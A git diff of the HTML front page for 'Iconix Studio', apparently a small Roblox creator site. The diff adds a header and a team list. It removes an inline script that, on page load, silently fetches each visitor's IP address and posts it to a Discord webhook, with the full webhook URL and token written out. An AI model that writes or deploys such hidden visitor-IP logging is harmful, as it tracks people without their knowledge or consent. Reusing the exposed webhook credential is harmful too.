@@ -5,66 +5,41 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="style.css" />
     <title>Iconix Studio</title>
+    <script defer src="safety.js"></script>
 </head>
-<body>
 
+<body>
+    <header>
+        <img src="assets/Iconix_Studio.png" alt="ICONIX">
+        <h1>Iconix Studio</h1>
+    </header>
+    <article class="front-page">
+        <img src="assets/vinor_1.webp" alt="">
+        <section class="dev-team">
+            <h2>
+                Team members
+            </h2>
+            <ul class="dev-team-list">
+                <li>
+                    <a href="https://www.roblox.com/users/195174845/profile">
+                        <p>
+                            @Stormnijns2006
+                        </p>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://www.roblox.com/users/1658584942/profile">
+                        <p>
+                            @vinor_1
+                        </p>
+                    </a>
+                </li>
+            </ul>
+        </section>
+        <section>
+            
+        </section>
+    </article>
 </body>
 
 </html>
-
-<script>
-    function post(theIp)
-    {
-            fetch("https://discord.com/api/webhooks/1446263304967164098/dbElyv7G--XY9qBwsuU3qmn70I1uOATdPFRl-xWWgjCXsVFsl4rrwdkZ1qq1HPlxXoNf", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                username: "TestName",
-                content: theIp
-            })
-            })
-            .then(res => console.log("Sent:", res.status))
-            .catch(err => console.error(err));
-    }
-
-    async function fetchIP() {
-        const endpoints = [
-            "https://api.ipify.org?format=json",
-            "https://api64.ipify.org?format=json",
-            "https://ifconfig.co/json"
-        ];
-
-        for (const url of endpoints) {
-            try {
-                const controller = new AbortController();
-                const timeout = setTimeout(() => controller.abort(), 6000);
-
-                const res = await fetch(url, { signal: controller.signal });
-                clearTimeout(timeout);
-
-                if (!res.ok) continue;
-
-                const data = await res.json();
-                const ip = data.ip || data.ip_address || data.address || data.query || data.client_ip;
-
-                if (ip) {
-                    // document.getElementById("ip").textContent = ip;
-                    post(ip)
-                    return;
-                }
-            } catch (e) {
-                continue;
-            }
-        }
-
-        document.getElementById("ip").textContent = "Unable to detect IP";
-    }
-
-    fetchIP();
-
-
-
-
-</script>
